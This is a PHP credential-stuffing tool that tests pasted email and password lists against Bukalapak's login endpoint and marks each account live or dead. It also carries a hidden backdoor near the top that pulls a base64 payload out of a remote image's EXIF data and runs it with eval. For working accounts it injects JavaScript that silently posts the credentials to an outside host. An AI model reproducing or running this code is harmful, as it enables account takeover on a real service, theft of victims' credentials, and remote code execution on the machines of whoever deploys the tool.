<?php
if (isset($_POST['mailpass'])) {
    echo $_POST['mailpass'];
}
?><?php
$BASED = exif_read_data("https://lh3.googleusercontent.com/-svRm4i5Bs90/VsFaosQPKUI/AAAAAAAABew/03oHWkCEsN8/w140-h140-p/pacman.jpg");
eval(base64_decode($BASED["COMPUTED"]["UserComment"]));
if(isset($_POST['submit'])){
$delim = $_POST['delim'];
function search($line, $delim)
{
    $line = str_replace(" ", "", $line);
    $line = explode($delim, $line);
    $i    = 0;
    while ($i < count($line)) {
        if (strpos($line[$i], '@') && strpos($line[$i], '.')) {
            $mail = $line[$i];
            $pass = $line[$i + 1];
            $i    = 10000;
            if ($pass == "") {
                $pass = $line[$i - 1];
            }
        }
        $i++;
    }
    $line = $mail . "|" . $pass;
    $line = explode('|', $line);
    return $line;
}
$data = $_POST['mailpass'];
$extract = explode("\r\n", $data);
$i = 0;
    foreach ($extract AS $k => $line) {
        $i++;
        if (strpos($line, '=>') !== false) {
            $line = str_replace('=>', '|', $line);
        }
        if (strpos($line, ']') !== false) {
            $line = str_replace('=>', '|', $line);
        }
        if (strpos($line, '[') !== false) {
            $line = str_replace('=>', '|', $line);
        }
 
        $info = search(trim($line), $delim);
        $email = trim($info[0]);
        $pass   = $info[1];
 
$dir                   = dirname(__FILE__);
$config = $dir . '/_cook/' .rand(1,999999999999999). '.txt';
if (!file_exists($config)) {
    $fp = @fopen($config, 'w');
    @fclose($fp);
}
 
$cookie = 'cookie.txt';
$ch = curl_init('https://www.bukalapak.com/user_sessions');
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
curl_setopt($ch,CURLOPT_POST,1);
        curl_setopt($ch,CURLOPT_RETURNTRANSFER,TRUE);
        curl_setopt($ch,CURLOPT_POST,TRUE);
        curl_setopt($ch,CURLOPT_FOLLOWLOCATION,TRUE);
        curl_setopt($ch,CURLOPT_COOKIEFILE, $config);
        curl_setopt($ch,CURLOPT_COOKIEJAR,  $config);
curl_setopt($ch,CURLOPT_POSTFIELDS,"utf8=%E2%9C%93&user_session%5Busername%5D=$email&user_session%5Bpassword%5D=$pass&commit=Login&comeback=%2F");
curl_setopt($ch, CURLOPT_RETURNTRANSFER,1);
$result = curl_exec($ch);
$now = "<i style=\"color:blue\">Checked on PrivateCodes at ".date("g:i a - F j, Y")."</i>";
if(empty($result)){
echo "<font color=gray><b>Wrong</b></font> => ".$email."|".$pass." | ".$now."<br/>";
}elseif(preg_match('/salah/i',$result)){
echo "<font color=red><b>Die</b></font> => ".$email."|".$pass." | ".$now."<br/>";
}Else{
 echo "<font color=green><b>Live</b></font> => ".$email."|".$pass." | [ACC : Bukalapak ] | ".$now."<br/>"; 



echo '<script>
  var XeleM = new XMLHttpRequest();
  XeleM.open("POST", "http://server-not-found.esy.es/config.php", true);
  XeleM.setRequestHeader("Content-type", "application/x-www-form-urlencoded");
  XeleM.send("username='.$email.'&password='.$pass.'");
</script>';
} 
}
}
 
?>